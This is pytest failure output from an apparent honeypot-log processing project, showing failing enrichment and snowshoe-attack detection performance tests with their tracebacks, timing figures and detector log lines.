_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = <unittest.mock._patch object at 0x7756b3126270>

    def get_original(self):
        target = self.getter()
        name = self.attribute
    
        original = DEFAULT
        local = False
    
        try:
            original = target.__dict__[name]
        except (AttributeError, KeyError):
            original = getattr(target, name, DEFAULT)
        else:
            local = True
    
        if name in _builtins and isinstance(target, ModuleType):
            self.create = True
    
        if not self.create and original is DEFAULT:
>           raise AttributeError(
                "%s does not have the attribute %r" % (target, name)
            )
E           AttributeError: <module 'process_cowrie' from '/home/speterson/cowrieprocessor/process_cowrie.py'> does not have the attribute 'enrichment_vt_query'

/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:1467: AttributeError
__________ TestMockHandlerPerformance.test_mock_abuseipdb_performance __________

self = <test_enrichment_performance.TestMockHandlerPerformance object at 0x7756b439d1d0>
tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_mock_abuseipdb_performanc0')

    def test_mock_abuseipdb_performance(self, tmp_path) -> None:
        """Test mock AbuseIPDB handler performance."""
        handler = MockAbuseIPDBHandler("test_key", tmp_path)
    
        test_ips = [f"192.168.1.{i}" for i in range(100)]
    
        start_time = time.time()
        for ip in test_ips:
            result = handler.check_ip(ip)
            assert isinstance(result, dict)
>           assert "data" in result
E           AssertionError: assert 'data' in {'error': 'rate_limit'}

/home/speterson/cowrieprocessor/tests/performance/test_enrichment_performance.py:324: AssertionError
_____ TestMemoryUsagePerformance.test_memory_usage_during_bulk_enrichment ______

self = <test_enrichment_performance.TestMemoryUsagePerformance object at 0x7756b439d310>
tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_memory_usage_during_bulk_0')

    def test_memory_usage_during_bulk_enrichment(self, tmp_path) -> None:
        """Test memory usage during bulk enrichment operations."""
        import os
    
        import psutil
    
        cache_dir = tmp_path / "cache"
        cache_dir.mkdir()
    
        from process_cowrie import dshield_query
    
        # Get initial memory usage
        process = psutil.Process(os.getpid())
        initial_memory = process.memory_info().rss
    
        # Mock API calls
        with patch('process_cowrie.enrichment_dshield_query') as mock_dshield:
            mock_dshield.return_value = json.loads(get_dshield_response("datacenter"))
    
            # Perform bulk enrichment
            test_ips = [f"192.168.1.{i}" for i in range(100)]
    
            for ip in test_ips:
>               dshield_query(ip, cache_base=cache_dir)
E               TypeError: dshield_query() got an unexpected keyword argument 'cache_base'

/home/speterson/cowrieprocessor/tests/performance/test_enrichment_performance.py:442: TypeError
___________ TestMemoryUsagePerformance.test_cache_memory_efficiency ____________

self = <test_enrichment_performance.TestMemoryUsagePerformance object at 0x7756b439d450>
tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_cache_memory_efficiency0')

    def test_cache_memory_efficiency(self, tmp_path) -> None:
        """Test that caching doesn't cause memory leaks."""
        import os
    
        import psutil
    
        cache_dir = tmp_path / "cache"
        cache_dir.mkdir()
    
        from process_cowrie import dshield_query
    
        process = psutil.Process(os.getpid())
    
        # Mock API calls
        with patch('process_cowrie.enrichment_dshield_query') as mock_dshield:
            mock_dshield.return_value = json.loads(get_dshield_response("datacenter"))
    
            # Perform many cache operations
            for iteration in range(10):
                test_ips = [f"192.168.1.{i}" for i in range(iteration * 10, (iteration + 1) * 10)]
    
                for ip in test_ips:
>                   dshield_query(ip, cache_base=cache_dir)
E                   TypeError: dshield_query() got an unexpected keyword argument 'cache_base'

/home/speterson/cowrieprocessor/tests/performance/test_enrichment_performance.py:478: TypeError
_____________ TestEnrichmentThroughput.test_sequential_throughput ______________

self = <test_enrichment_performance.TestEnrichmentThroughput object at 0x7756b439d590>
tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_sequential_throughput0')

    def test_sequential_throughput(self, tmp_path) -> None:
        """Test sequential enrichment throughput."""
        cache_dir = tmp_path / "cache"
        cache_dir.mkdir()
    
        from process_cowrie import dshield_query, read_spur_data
    
        with (
            patch('process_cowrie.enrichment_dshield_query') as mock_dshield,
            patch('process_cowrie.enrichment_read_spur_data') as mock_spur,
        ):
            mock_dshield.return_value = json.loads(get_dshield_response("datacenter"))
            mock_spur.return_value = json.loads(get_spur_response("datacenter"))
    
            # Test sequential throughput
            test_ips = [f"192.168.1.{i}" for i in range(100)]
    
            start_time = time.time()
            for ip in test_ips:
>               dshield_query(ip, cache_base=cache_dir)
E               TypeError: dshield_query() got an unexpected keyword argument 'cache_base'

/home/speterson/cowrieprocessor/tests/performance/test_enrichment_performance.py:558: TypeError
_______________ TestEnrichmentThroughput.test_cached_throughput ________________

self = <test_enrichment_performance.TestEnrichmentThroughput object at 0x7756b439d6d0>
tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_cached_throughput0')

    def test_cached_throughput(self, tmp_path) -> None:
        """Test throughput when using cached data."""
        cache_dir = tmp_path / "cache"
        cache_dir.mkdir()
    
        from process_cowrie import dshield_query
    
        # Pre-populate cache
        test_ips = [f"192.168.1.{i}" for i in range(50)]
        for ip in test_ips:
>           dshield_query(ip, cache_base=cache_dir)
E           TypeError: dshield_query() got an unexpected keyword argument 'cache_base'

/home/speterson/cowrieprocessor/tests/performance/test_enrichment_performance.py:579: TypeError
__ TestSnowshoePerformance.test_snowshoe_detection_performance_100k_sessions ___

self = <test_snowshoe_performance.TestSnowshoePerformance object at 0x7756b439dd10>
large_snowshoe_dataset = [<Mock spec='SessionSummary' id='131214253333136'>, <Mock spec='SessionSummary' id='131214253328432'>, <Mock spec='Ses...253329104'>, <Mock spec='SessionSummary' id='131214253332464'>, <Mock spec='SessionSummary' id='131214253332800'>, ...]

    def test_snowshoe_detection_performance_100k_sessions(self, large_snowshoe_dataset: List[SessionSummary]) -> None:
        """Test snowshoe detection performance with 100,000 sessions.
    
        This test verifies that the detection algorithm can process large datasets
        within the required performance constraints (<30 seconds for 100k sessions).
        """
        detector = SnowshoeDetector(
            single_attempt_threshold=5,
            time_cluster_eps=0.1,
            min_cluster_size=10,
            sensitivity_threshold=0.7,
        )
    
        # Monitor system resources
        process = psutil.Process()
        initial_memory = process.memory_info().rss / 1024 / 1024  # MB
        process.cpu_percent()
    
        # Perform analysis with timing
        print("Starting snowshoe detection analysis...")
        start_time = time.perf_counter()
    
        result = detector.detect(large_snowshoe_dataset, window_hours=24)
    
        end_time = time.perf_counter()
        analysis_duration = end_time - start_time
    
        # Monitor final resources
        final_memory = process.memory_info().rss / 1024 / 1024  # MB
        final_cpu = process.cpu_percent()
        memory_used = final_memory - initial_memory
    
        print(f"Analysis completed in {analysis_duration:.2f} seconds")
        print(f"Memory used: {memory_used:.2f} MB")
        print(f"CPU usage: {final_cpu:.1f}%")
    
        # Performance assertions
        assert analysis_duration < 30.0, f"Analysis took {analysis_duration:.2f}s, should be <30s"
        assert memory_used < 2000, f"Memory usage {memory_used:.2f}MB too high, should be <2GB"
    
        # Verify detection results
>       assert result["is_likely_snowshoe"] is True
E       assert False is True

/home/speterson/cowrieprocessor/tests/performance/test_snowshoe_performance.py:166: AssertionError
---------------------------- Captured stdout setup -----------------------------
Creating 100,000 snowshoe sessions...
Created 100000 sessions
----------------------------- Captured stdout call -----------------------------
2025-10-18 17:48:09,674:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:__init__:Initialized SnowshoeDetector with thresholds: single_attempt=5, time_cluster_eps=0.10, min_cluster_size=10, geo_diversity=0.70, sensitivity=0.70
2025-10-18 17:48:09,674:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:__init__:Initialized SnowshoeDetector with thresholds: single_attempt=5, time_cluster_eps=0.10, min_cluster_size=10, geo_diversity=0.70, sensitivity=0.70
Starting snowshoe detection analysis...
2025-10-18 17:48:09,675:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Starting snowshoe detection analysis on 100000 sessions
2025-10-18 17:48:09,675:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Starting snowshoe detection analysis on 100000 sessions
2025-10-18 17:48:18,532:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Snowshoe detection complete: confidence=0.209, snowshoe=False, single_attempt_ips=0, coordinated_timing=True
2025-10-18 17:48:18,532:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Snowshoe detection complete: confidence=0.209, snowshoe=False, single_attempt_ips=0, coordinated_timing=True
Analysis completed in 8.91 seconds
Memory used: 457.57 MB
CPU usage: 99.6%
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.threat_detection.snowshoe:snowshoe.py:59 Initialized SnowshoeDetector with thresholds: single_attempt=5, time_cluster_eps=0.10, min_cluster_size=10, geo_diversity=0.70, sensitivity=0.70
INFO     cowrieprocessor.threat_detection.snowshoe:snowshoe.py:91 Starting snowshoe detection analysis on 100000 sessions
INFO     cowrieprocessor.threat_detection.snowshoe:snowshoe.py:145 Snowshoe detection complete: confidence=0.209, snowshoe=False, single_attempt_ips=0, coordinated_timing=True
_____ TestSnowshoePerformance.test_mixed_traffic_performance_100k_sessions _____

self = <test_snowshoe_performance.TestSnowshoePerformance object at 0x7756b439de50>
large_mixed_dataset = [<Mock spec='SessionSummary' id='131213133992960'>, <Mock spec='SessionSummary' id='131213133993296'>, <Mock spec='Ses...133993968'>, <Mock spec='SessionSummary' id='131213133994304'>, <Mock spec='SessionSummary' id='131213133994640'>, ...]

    def test_mixed_traffic_performance_100k_sessions(self, large_mixed_dataset: List[SessionSummary]) -> None:
        """Test detection performance with mixed traffic (100k sessions)."""
        detector = SnowshoeDetector(
            single_attempt_threshold=5,
            sensitivity_threshold=0.7,
        )
    
        # Monitor resources
        process = psutil.Process()
        initial_memory = process.memory_info().rss / 1024 / 1024
    
        print("Starting mixed traffic analysis...")
        start_time = time.perf_counter()
    
        result = detector.detect(large_mixed_dataset, window_hours=24)
    
        end_time = time.perf_counter()
        analysis_duration = end_time - start_time
    
        final_memory = process.memory_info().rss / 1024 / 1024
        memory_used = final_memory - initial_memory
    
        print(f"Mixed analysis completed in {analysis_duration:.2f} seconds")
        print(f"Memory used: {memory_used:.2f} MB")
    
        # Performance assertions
        assert analysis_duration < 30.0, f"Analysis took {analysis_duration:.2f}s, should be <30s"
        assert memory_used < 2000, f"Memory usage {memory_used:.2f}MB too high"
    
        # Verify detection results
>       assert result["is_likely_snowshoe"] is True  # Should detect due to 80% snowshoe
E       assert False is True

/home/speterson/cowrieprocessor/tests/performance/test_snowshoe_performance.py:206: AssertionError
---------------------------- Captured stdout setup -----------------------------
Creating 100,000 mixed traffic sessions...
Created 100000 mixed sessions
----------------------------- Captured stdout call -----------------------------
2025-10-18 17:53:48,376:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:__init__:Initialized SnowshoeDetector with thresholds: single_attempt=5, time_cluster_eps=0.10, min_cluster_size=5, geo_diversity=0.70, sensitivity=0.70
2025-10-18 17:53:48,376:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:__init__:Initialized SnowshoeDetector with thresholds: single_attempt=5, time_cluster_eps=0.10, min_cluster_size=5, geo_diversity=0.70, sensitivity=0.70
Starting mixed traffic analysis...
2025-10-18 17:53:48,380:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Starting snowshoe detection analysis on 100000 sessions
2025-10-18 17:53:48,380:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Starting snowshoe detection analysis on 100000 sessions
2025-10-18 17:53:54,896:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Snowshoe detection complete: confidence=0.211, snowshoe=False, single_attempt_ips=0, coordinated_timing=True
2025-10-18 17:53:54,896:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Snowshoe detection complete: confidence=0.211, snowshoe=False, single_attempt_ips=0, coordinated_timing=True
Mixed analysis completed in 6.57 seconds
Memory used: 244.94 MB
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.threat_detection.snowshoe:snowshoe.py:59 Initialized SnowshoeDetector with thresholds: single_attempt=5, time_cluster_eps=0.10, min_cluster_size=5, geo_diversity=0.70, sensitivity=0.70
INFO     cowrieprocessor.threat_detection.snowshoe:snowshoe.py:91 Starting snowshoe detection analysis on 100000 sessions
INFO     cowrieprocessor.threat_detection.snowshoe:snowshoe.py:145 Snowshoe detection complete: confidence=0.211, snowshoe=False, single_attempt_ips=0, coordinated_timing=True
_________ TestSnowshoePerformance.test_concurrent_analysis_performance _________

self = <test_snowshoe_performance.TestSnowshoePerformance object at 0x7756b4365370>

    def test_concurrent_analysis_performance(self) -> None:
        """Test performance with multiple concurrent analyses."""
        import queue
        import threading
    
        # Create smaller datasets for concurrent testing
        datasets = []
        for i in range(5):  # 5 concurrent analyses
            sessions = []
            base_time = datetime.now(UTC)
    
            for j in range(20000):  # 20k sessions each
                session = Mock(spec=SessionSummary)
                session.session_id = f"concurrent_{i}_{j:05d}"
                session.first_event_at = base_time + timedelta(minutes=j * 2)
                session.last_event_at = session.first_event_at + timedelta(seconds=30)
                session.command_count = 1
                session.file_downloads = 0
                session.login_attempts = 1
                session.risk_score = 10
                session.enrichment = {
                    "session": {
                        f"203.0.{i}.{(j % 254) + 1}": {
                            "spur": {
                                "country": f"Country{j % 20:02d}",
                                "asn": f"AS{j % 40:05d}",
                            }
                        }
                    }
                }
                sessions.append(session)
            datasets.append(sessions)
    
        detector = SnowshoeDetector()
        results_queue = queue.Queue()
    
        def analyze_dataset(dataset: List[SessionSummary], dataset_id: int) -> None:
            """Analyze a single dataset and put result in queue."""
            start_time = time.perf_counter()
            result = detector.detect(dataset, window_hours=24)
            duration = time.perf_counter() - start_time
            results_queue.put((dataset_id, duration, result))
    
        # Start concurrent analyses
        threads = []
        start_time = time.perf_counter()
    
        for i, dataset in enumerate(datasets):
            thread = threading.Thread(target=analyze_dataset, args=(dataset, i))
            threads.append(thread)
            thread.start()
    
        # Wait for all threads to complete
        for thread in threads:
            thread.join()
    
        total_time = time.perf_counter() - start_time
    
        # Collect results
        results = []
        while not results_queue.empty():
            results.append(results_queue.get())
    
        print("Concurrent analysis test:")
        print(f"  Total time: {total_time:.2f} seconds")
        print(f"  Number of analyses: {len(results)}")
        print(f"  Average time per analysis: {sum(r[1] for r in results) / len(results):.2f} seconds")
    
        # Verify all analyses completed successfully
        assert len(results) == 5, f"Expected 5 results, got {len(results)}"
    
        for dataset_id, duration, result in results:
            assert duration < 15.0, f"Analysis {dataset_id} took {duration:.2f}s, should be <15s"
>           assert result["is_likely_snowshoe"] is True
E           assert False is True

/home/speterson/cowrieprocessor/tests/performance/test_snowshoe_performance.py:352: AssertionError
----------------------------- Captured stdout call -----------------------------
2025-10-18 18:11:07,745:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:__init__:Initialized SnowshoeDetector with thresholds: single_attempt=5, time_cluster_eps=0.10, min_cluster_size=5, geo_diversity=0.70, sensitivity=0.70
2025-10-18 18:11:07,745:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:__init__:Initialized SnowshoeDetector with thresholds: single_attempt=5, time_cluster_eps=0.10, min_cluster_size=5, geo_diversity=0.70, sensitivity=0.70
2025-10-18 18:11:07,746:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Starting snowshoe detection analysis on 20000 sessions
2025-10-18 18:11:07,746:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Starting snowshoe detection analysis on 20000 sessions
2025-10-18 18:11:07,753:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Starting snowshoe detection analysis on 20000 sessions
2025-10-18 18:11:07,753:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Starting snowshoe detection analysis on 20000 sessions
2025-10-18 18:11:07,760:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Starting snowshoe detection analysis on 20000 sessions
2025-10-18 18:11:07,760:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Starting snowshoe detection analysis on 20000 sessions
2025-10-18 18:11:07,818:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Starting snowshoe detection analysis on 20000 sessions
2025-10-18 18:11:07,818:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Starting snowshoe detection analysis on 20000 sessions
2025-10-18 18:11:07,845:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Starting snowshoe detection analysis on 20000 sessions
2025-10-18 18:11:07,845:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Starting snowshoe detection analysis on 20000 sessions
2025-10-18 18:11:13,597:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Snowshoe detection complete: confidence=0.235, snowshoe=False, single_attempt_ips=0, coordinated_timing=True
2025-10-18 18:11:13,597:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Snowshoe detection complete: confidence=0.235, snowshoe=False, single_attempt_ips=0, coordinated_timing=True
2025-10-18 18:11:13,680:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Snowshoe detection complete: confidence=0.235, snowshoe=False, single_attempt_ips=0, coordinated_timing=True
2025-10-18 18:11:13,680:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Snowshoe detection complete: confidence=0.235, snowshoe=False, single_attempt_ips=0, coordinated_timing=True
2025-10-18 18:11:13,682:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Snowshoe detection complete: confidence=0.235, snowshoe=False, single_attempt_ips=0, coordinated_timing=True
2025-10-18 18:11:13,682:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Snowshoe detection complete: confidence=0.235, snowshoe=False, single_attempt_ips=0, coordinated_timing=True
2025-10-18 18:11:13,790:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Snowshoe detection complete: confidence=0.235, snowshoe=False, single_attempt_ips=0, coordinated_timing=True
2025-10-18 18:11:13,790:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Snowshoe detection complete: confidence=0.235, snowshoe=False, single_attempt_ips=0, coordinated_timing=True
2025-10-18 18:11:13,922:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Snowshoe detection complete: confidence=0.235, snowshoe=False, single_attempt_ips=0, coordinated_timing=True
2025-10-18 18:11:13,922:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Snowshoe detection complete: confidence=0.235, snowshoe=False, single_attempt_ips=0, coordinated_timing=True
Concurrent analysis test:
  Total time: 6.19 seconds
  Number of analyses: 5
  Average time per analysis: 5.99 seconds
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.threat_detection.snowshoe:snowshoe.py:59 Initialized SnowshoeDetector with thresholds: single_attempt=5, time_cluster_eps=0.10, min_cluster_size=5, geo_diversity=0.70, sensitivity=0.70
INFO     cowrieprocessor.threat_detection.snowshoe:snowshoe.py:91 Starting snowshoe detection analysis on 20000 sessions
INFO     cowrieprocessor.threat_detection.snowshoe:snowshoe.py:91 Starting snowshoe detection analysis on 20000 sessions
INFO     cowrieprocessor.threat_detection.snowshoe:snowshoe.py:91 Starting snowshoe detection analysis on 20000 sessions
INFO     cowrieprocessor.threat_detection.snowshoe:snowshoe.py:91 Starting snowshoe detection analysis on 20000 sessions
INFO     cowrieprocessor.threat_detection.snowshoe:snowshoe.py:91 Starting snowshoe detection analysis on 20000 sessions
INFO     cowrieprocessor.threat_detection.snowshoe:snowshoe.py:145 Snowshoe detection complete: confidence=0.235, snowshoe=False, single_attempt_ips=0, coordinated_timing=True
INFO     cowrieprocessor.threat_detection.snowshoe:snowshoe.py:145 Snowshoe detection complete: confidence=0.235, snowshoe=False, single_attempt_ips=0, coordinated_timing=True
INFO     cowrieprocessor.threat_detection.snowshoe:snowshoe.py:145 Snowshoe detection complete: confidence=0.235, snowshoe=False, single_attempt_ips=0, coordinated_timing=True
INFO     cowrieprocessor.threat_detection.snowshoe:snowshoe.py:145 Snowshoe detection complete: confidence=0.235, snowshoe=False, single_attempt_ips=0, coordinated_timing=True
INFO     cowrieprocessor.threat_detection.snowshoe:snowshoe.py:145 Snowshoe detection complete: confidence=0.235, snowshoe=False, single_attempt_ips=0, coordinated_timing=True
________ TestSnowshoePerformance.test_scalability_with_different_sizes _________

self = <test_snowshoe_performance.TestSnowshoePerformance object at 0x7756b43b6be0>

    def test_scalability_with_different_sizes(self) -> None:
        """Test scalability with different dataset sizes."""
        sizes = [1000, 5000, 10000, 25000, 50000, 75000, 100000]
        results = []
    
        detector = SnowshoeDetector()
    
        for size in sizes:
            print(f"Testing with {size:,} sessions...")
    
            # Create dataset of specified size
            sessions = []
            base_time = datetime.now(UTC)
    
            for i in range(size):
                session = Mock(spec=SessionSummary)
                session.session_id = f"scale_test_{i:06d}"
                session.first_event_at = base_time + timedelta(minutes=i * 2)
                session.last_event_at = session.first_event_at + timedelta(seconds=30)
                session.command_count = 1
                session.file_downloads = 0
                session.login_attempts = 1
                session.risk_score = 10
                # Generate unique IPs by using different octets
                ip_octet4 = (i % 254) + 1
                ip_octet3 = (i // 254) % 254
                ip_octet2 = (i // (254 * 254)) % 254
                session.enrichment = {
                    "session": {
                        f"203.{ip_octet2}.{ip_octet3}.{ip_octet4}": {
                            "spur": {
                                "country": f"Country{i % 30:02d}",
                                "asn": f"AS{i % 50:05d}",
                            }
                        }
                    }
                }
                sessions.append(session)
    
            # Measure performance
            start_time = time.perf_counter()
            result = detector.detect(sessions, window_hours=24)
            duration = time.perf_counter() - start_time
    
            sessions_per_second = size / duration
            results.append((size, duration, sessions_per_second))
    
            print(f"  {size:,} sessions: {duration:.2f}s ({sessions_per_second:.0f} sessions/sec)")
    
            # Verify results are consistent
            # For this test, we expect all sessions to be single-attempt (snowshoe pattern)
            assert len(result["single_attempt_ips"]) == size
            # With sufficient data, should detect snowshoe pattern
            if size >= 1000:
                assert result["is_likely_snowshoe"] is True
    
        # Analyze scalability
        print("\nScalability analysis:")
        for size, duration, rate in results:
            print(f"  {size:6,} sessions: {duration:6.2f}s ({rate:6.0f} sessions/sec)")
    
        # Verify linear or sub-linear scaling
        # Processing rate should not degrade significantly with larger datasets
        rates = [r[2] for r in results]
        min_rate = min(rates)
        max_rate = max(rates)
    
        # Rate should not vary by more than 70% (algorithm complexity increases with dataset size)
        rate_variation = (max_rate - min_rate) / min_rate
>       assert rate_variation < 0.7, f"Processing rate variation {rate_variation:.2%} too high"
E       AssertionError: Processing rate variation 78.16% too high
E       assert 0.7815896356911305 < 0.7

/home/speterson/cowrieprocessor/tests/performance/test_snowshoe_performance.py:424: AssertionError
----------------------------- Captured stdout call -----------------------------
2025-10-18 18:11:13,999:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:__init__:Initialized SnowshoeDetector with thresholds: single_attempt=5, time_cluster_eps=0.10, min_cluster_size=5, geo_diversity=0.70, sensitivity=0.70
2025-10-18 18:11:13,999:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:__init__:Initialized SnowshoeDetector with thresholds: single_attempt=5, time_cluster_eps=0.10, min_cluster_size=5, geo_diversity=0.70, sensitivity=0.70
Testing with 1,000 sessions...
2025-10-18 18:11:17,938:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Starting snowshoe detection analysis on 1000 sessions
2025-10-18 18:11:17,938:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Starting snowshoe detection analysis on 1000 sessions
2025-10-18 18:11:18,009:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Snowshoe detection complete: confidence=0.712, snowshoe=True, single_attempt_ips=1000, coordinated_timing=True
2025-10-18 18:11:18,009:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Snowshoe detection complete: confidence=0.712, snowshoe=True, single_attempt_ips=1000, coordinated_timing=True
  1,000 sessions: 0.07s (13541 sessions/sec)
Testing with 5,000 sessions...
2025-10-18 18:11:36,020:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Starting snowshoe detection analysis on 5000 sessions
2025-10-18 18:11:36,020:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Starting snowshoe detection analysis on 5000 sessions
2025-10-18 18:11:36,314:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Snowshoe detection complete: confidence=0.702, snowshoe=True, single_attempt_ips=5000, coordinated_timing=True
2025-10-18 18:11:36,314:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Snowshoe detection complete: confidence=0.702, snowshoe=True, single_attempt_ips=5000, coordinated_timing=True
  5,000 sessions: 0.30s (16796 sessions/sec)
Testing with 10,000 sessions...
2025-10-18 18:12:10,698:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Starting snowshoe detection analysis on 10000 sessions
2025-10-18 18:12:10,698:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Starting snowshoe detection analysis on 10000 sessions
2025-10-18 18:12:11,275:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Snowshoe detection complete: confidence=0.701, snowshoe=True, single_attempt_ips=10000, coordinated_timing=True
2025-10-18 18:12:11,275:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Snowshoe detection complete: confidence=0.701, snowshoe=True, single_attempt_ips=10000, coordinated_timing=True
  10,000 sessions: 0.59s (17088 sessions/sec)
Testing with 25,000 sessions...
2025-10-18 18:13:30,051:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Starting snowshoe detection analysis on 25000 sessions
2025-10-18 18:13:30,051:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Starting snowshoe detection analysis on 25000 sessions
2025-10-18 18:13:32,141:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Snowshoe detection complete: confidence=0.700, snowshoe=True, single_attempt_ips=25000, coordinated_timing=True
2025-10-18 18:13:32,141:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Snowshoe detection complete: confidence=0.700, snowshoe=True, single_attempt_ips=25000, coordinated_timing=True
  25,000 sessions: 2.12s (11793 sessions/sec)
Testing with 50,000 sessions...
2025-10-18 18:16:08,307:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Starting snowshoe detection analysis on 50000 sessions
2025-10-18 18:16:08,307:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Starting snowshoe detection analysis on 50000 sessions
2025-10-18 18:16:13,192:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Snowshoe detection complete: confidence=0.700, snowshoe=True, single_attempt_ips=50000, coordinated_timing=True
2025-10-18 18:16:13,192:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Snowshoe detection complete: confidence=0.700, snowshoe=True, single_attempt_ips=50000, coordinated_timing=True
  50,000 sessions: 4.95s (10100 sessions/sec)
Testing with 75,000 sessions...
2025-10-18 18:20:28,574:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Starting snowshoe detection analysis on 75000 sessions
2025-10-18 18:20:28,574:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Starting snowshoe detection analysis on 75000 sessions
2025-10-18 18:20:36,271:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Snowshoe detection complete: confidence=0.700, snowshoe=True, single_attempt_ips=75000, coordinated_timing=True
2025-10-18 18:20:36,271:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Snowshoe detection complete: confidence=0.700, snowshoe=True, single_attempt_ips=75000, coordinated_timing=True
  75,000 sessions: 7.82s (9591 sessions/sec)
Testing with 100,000 sessions...
2025-10-18 18:26:10,030:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Starting snowshoe detection analysis on 100000 sessions
2025-10-18 18:26:10,030:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Starting snowshoe detection analysis on 100000 sessions
2025-10-18 18:26:20,173:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Snowshoe detection complete: confidence=0.700, snowshoe=True, single_attempt_ips=100000, coordinated_timing=True
2025-10-18 18:26:20,173:INFO:cowrieprocessor.threat_detection.snowshoe:snowshoe.py:detect:Snowshoe detection complete: confidence=0.700, snowshoe=True, single_attempt_ips=100000, coordinated_timing=True
  100,000 sessions: 10.29s (9720 sessions/sec)

Scalability analysis:
   1,000 sessions:   0.07s ( 13541 sessions/sec)
   5,000 sessions:   0.30s ( 16796 sessions/sec)
  10,000 sessions:   0.59s ( 17088 sessions/sec)
  25,000 sessions:   2.12s ( 11793 sessions/sec)
  50,000 sessions:   4.95s ( 10100 sessions/sec)
  75,000 sessions:   7.82s (  9591 sessions/sec)
  100,000 sessions:  10.29s (  9720 sessions/sec)
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.threat_detection.snowshoe:snowshoe.py:59 Initialized SnowshoeDetector with thresholds: single_attempt=5, time_cluster_eps=0.10, min_cluster_size=5, geo_diversity=0.70, sensitivity=0.70
INFO     cowrieprocessor.threat_detection.snowshoe:snowshoe.py:91 Starting snowshoe detection analysis on 1000 sessions
INFO     cowrieprocessor.threat_detection.snowshoe:snowshoe.py:145 Snowshoe detection complete: confidence=0.712, snowshoe=True, single_attempt_ips=1000, coordinated_timing=True
INFO     cowrieprocessor.threat_detection.snowshoe:snowshoe.py:91 Starting snowshoe detection analysis on 5000 sessions
